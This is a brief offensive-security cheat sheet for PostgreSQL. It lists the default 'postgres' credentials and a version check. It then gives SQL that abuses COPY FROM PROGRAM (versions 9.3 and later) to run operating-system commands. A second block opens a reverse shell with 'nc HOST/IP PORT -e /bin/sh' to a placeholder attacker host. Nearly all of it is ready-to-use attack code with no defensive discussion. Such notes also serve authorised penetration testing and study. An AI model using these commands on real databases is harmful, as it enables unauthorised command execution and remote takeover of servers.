# Postgresql  

### Connecting to the database
`psql -h HOST/IP -p PORT -U USER`  

Default username and database are both `postgres`   


### Determine the version  
`show version();`  

 
### Command Execution in Postgresql  >= 9.3

```
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);  
COPY cmd_exec FROM PROGRAM 'COMMAND';  
SELECT * FROM cmd_exec;  
```
<i>COMMAND</i> is the command to pass onto the operating system.  
Output of the command is shown after execution of the final SELECT command.  

**For reverse shell**:  
```
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);  
COPY cmd_exec FROM PROGRAM 'nc HOST/IP PORT -e /bin/sh & 2>/dev/null'; 
SELECT * FROM cmd_exec;  
```